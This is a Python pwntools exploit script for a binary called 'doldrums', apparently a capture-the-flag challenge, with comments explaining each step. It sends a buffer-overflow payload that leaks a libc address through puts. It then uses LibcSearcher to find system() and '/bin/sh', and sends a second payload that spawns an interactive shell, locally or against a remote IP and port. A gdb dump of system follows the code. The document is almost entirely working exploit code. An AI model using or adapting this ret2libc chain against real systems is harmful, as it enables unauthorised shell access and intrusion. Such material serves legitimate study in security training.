#!/usr/bin/env python3

from pwn import *
from LibcSearcher import LibcSearcher

doldrums = ELF('./doldrums')
	
def exploit(r):
	
	# you really need to leak the address of a libc function and then use that to calculate the libc start address, 
	# then set that for libc and then search in libc for /bin/sh. And everything has to be done without exiting the running process, 
	# because otherwise the addresses you leak change and aren't valid anymore due to Address Space Layout Randomization (ASLR).
	
	# Step by step:
	# 1. Run your exploit script on server until it leaks a libc function address 
	# --> use that libc function address to find the correct libc.so file that is used on the server by putting in the address and function name here:
	# https://libc.blukat.me/
	# And for step 1. I needed to actually leak two libc functions (I used "puts" and "gets") to uniquely determine the correct libc.so file on https://libc.blukat.me/
	# You can do that also by leaking the first, then returning back to main and repeating it for the second
	
	# JUNK + p32(PUTS_PLT) + p32(MAIN_PLT) + p32(FUNC_GOT)
	
	# 2. Run your exploit script again and load the found and downloaded libc.so file as LIBC = ELF('./xxxx-libc.so'), 
	# leak the libc function address again, but make sure, that after leaking libc address it returns back to the main function (0x080485e6), 
	# so that the binary doesn't exit and you can send another payload
	
	puts_plt = doldrums.plt["puts"]
	print("puts_plt: " + str(puts_plt))
	libc_start_main_got = doldrums.got['__libc_start_main']
	print("libc_start_main_got: " + str(libc_start_main_got))
	main = p32(0x080485e6) #doldrums.symbols['main']
	print("main: " + str(main))

	print("leak libc_start_main_got addr and return to main again")
	payload = flat(['A' * 13, puts_plt, main, libc_start_main_got])
	print("payload: " + str(payload))
	r.sendlineafter('Please press a key to continue!', payload)

	print("get the related addr")
	#r.interactive()
	r.recvuntil(b'Ancient_Mariner\n\n', drop=True)
	recv = r.recvuntil(b'\n')[0:4]
	print("recv: " + str(recv))
	libc_start_main_addr =  int.from_bytes(recv, "little")		# u32(r.recv()[0:4])
	print("libc_start_main_addr: " + str(libc_start_main_addr))
	libc = LibcSearcher('__libc_start_main', libc_start_main_addr) # __libc_start_main
	
	# 3. After receiving the leaked libc function address use it to calculate the offset and set the correct LIBC base address. 
	# Here is what that looks like in my code where libc_func = "puts" or whatever function address you leaked
	
	#leak = u32(received[0:4].ljust(4, b"\x00"))
	#LIBC.address = leak - LIBC.symbols[libc_func]
	
	print("libc.dump('__libc_start_main'): " + str(libc.dump('__libc_start_main')))
	
	libcbase = libc_start_main_addr - libc.dump('__libc_start_main') # libc.dump('__libc_start_main')
	print("libcbase: " + str(libcbase))
	system_addr = libcbase + libc.dump('system')
	print("system_addr: " + str(system_addr))
	binsh_addr = libcbase + libc.dump('str_bin_sh')
	print("binsh_addr: " + str(binsh_addr))
	
	# 4. Now that you have set the correct base address for LIBC you can search inside LIBC for /bin/sh  
	# and also for the system call by using LIBC.sym["system"] and send a second payload with a call to system and /bin/bash  as argument
	
	#BINSH = next(LIBC.search(b"/bin/sh"))
	#LIBC.sym["system"]
	
	print("get shell")
	payload = flat(['A' * 13, system_addr, 0xdeadbeef, binsh_addr])
	r.sendline(payload)
	
	# 5. Profit
	# Does that make sense?
	
	r.interactive()


if __name__ == '__main__':

	if(len(sys.argv) > 1):
		r = remote("46.101.107.117","2113")
		exploit(r)
	else:
		#file = 'doldrums' # 
		#binary = os.getcwd() + '/' + str(file)
		#r = process(binary)
		r = process('./doldrums')
		print(util.proc.pidof(r))
		pause()
		exploit(r)

"""
gdb-peda$ pdisass system
Dump of assembler code for function __libc_system:
   0x00007ffff7e07410 <+0>:	endbr64 
   0x00007ffff7e07414 <+4>:	test   rdi,rdi
   0x00007ffff7e07417 <+7>:	je     0x7ffff7e07420 <__libc_system+16>
   0x00007ffff7e07419 <+9>:	jmp    0x7ffff7e06e50 <do_system>
   0x00007ffff7e0741e <+14>:	xchg   ax,ax
   0x00007ffff7e07420 <+16>:	sub    rsp,0x8
   0x00007ffff7e07424 <+20>:	lea    rdi,[rip+0x162187]        # 0x7ffff7f695b2
   0x00007ffff7e0742b <+27>:	call   0x7ffff7e06e50 <do_system>
   0x00007ffff7e07430 <+32>:	test   eax,eax
   0x00007ffff7e07432 <+34>:	sete   al
   0x00007ffff7e07435 <+37>:	add    rsp,0x8
   0x00007ffff7e07439 <+41>:	movzx  eax,al
   0x00007ffff7e0743c <+44>:	ret    
End of assembler dump.
gdb-peda$ 
"""